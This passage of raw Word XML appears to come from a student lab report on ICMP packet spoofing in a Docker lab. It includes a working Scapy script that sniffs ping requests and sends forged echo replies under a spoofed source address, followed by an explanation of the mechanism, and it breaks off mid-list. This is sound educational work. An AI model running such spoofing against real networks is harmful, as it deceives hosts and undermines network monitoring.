        <w:t>successes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB9B35B" w14:textId="5EB61363" w:rsidR="008B3620" w:rsidRPr="00C2328F" w:rsidRDefault="008B3620" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>First login as host A. Open a new terminal and type:</w:t>
      </w:r>
      <w:r w:rsidR="00A07246" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A07246" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>docker exec -it hostA-10.9.0.5 bash</w:t>
      </w:r>
      <w:r w:rsidR="00A07246" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Then run </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>telnet 3.9.6.4</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FD0975" w14:textId="3348B6AE" w:rsidR="008B3620" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07950522" wp14:editId="2B48EA37">
            <wp:extent cx="5486400" cy="642620"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="3768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4065" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="642620"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="767E6A48" w14:textId="701B2941" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Fig12: pinging output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBEC18D" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="002DB57E" w14:textId="5FED042D" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">On the attacker terminal create a new python script to spoof by first typing: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nano icmp_spoof.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. The code to spoof is below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E6381B" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>scapy.all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> import *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F031ABB" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1525573F" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>def spoof(packet):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5490C129" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    if ICMP in packet and packet[ICMP].type == 8:  # Echo Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504F215A" w14:textId="36FF69AE" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = IP(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">="3.9.6.4", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00007C39" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00007C39" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>="10.9.0.5"</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BF6346" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>icmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77502548" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">        data = packet[Raw].load if Raw in packet else b''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B3257A" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">        reply = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>icmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> / data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB1AFEE" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">        send(reply, verbose=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB72BE8" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        print(f"[+] Spoofed ping reply sent to {packet[IP].</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001C333C" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54E63101" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>print("[*] Sniffing ping requests to 3.9.6.4 ...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A5F569" w14:textId="1DF2D3A6" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="00A07246">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sniff(filter="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>icmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>", prn=spoof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E18D8EC" w14:textId="77777777" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46928878" w14:textId="1E251CB4" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00A07246" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Then save and exit. Run it with </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python3 icmp_spoof.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> command</w:t>
      </w:r>
      <w:r w:rsidR="00B4522F" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CC0FDF" w14:textId="1048D385" w:rsidR="00B4522F" w:rsidRPr="00C2328F" w:rsidRDefault="00B4522F" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="54E74E56" wp14:editId="1B51E554">
            <wp:extent cx="6270171" cy="2164080"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="1326867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67411" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6274357" cy="2165525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E63C01" w14:textId="0EDB379C" w:rsidR="00A07246" w:rsidRPr="00C2328F" w:rsidRDefault="00B4522F" w:rsidP="008B3620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig13: spoof reply from the attacker show in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D498636" w14:textId="77777777" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00761F66" w:rsidP="00761F66">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Analyze the mechanism of packet spoofing attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15CAF6A5" w14:textId="7A7B83EC" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="001D0661" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The packet spoofing attack done above is a technique that the malicious user use to first sniff the packet and create a fake packet with the header of the source IP address to spoof as a different device. These packets are received by host A believing it is from a legitimate source.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2FF71D" w14:textId="3F66744A" w:rsidR="001D0661" w:rsidRPr="00C2328F" w:rsidRDefault="001D0661" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">This is based on the foundation that ping requires no established connections like TCP handshake or verify the user. This means that host A takes packet that has the correct header value that the attacker forged. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Here are the steps below on how the script of the attacker works for ping spoofing</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B47B88" w14:textId="2017886E" w:rsidR="001D0661" w:rsidRPr="00C2328F" w:rsidRDefault="001D0661" w:rsidP="001D0661">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
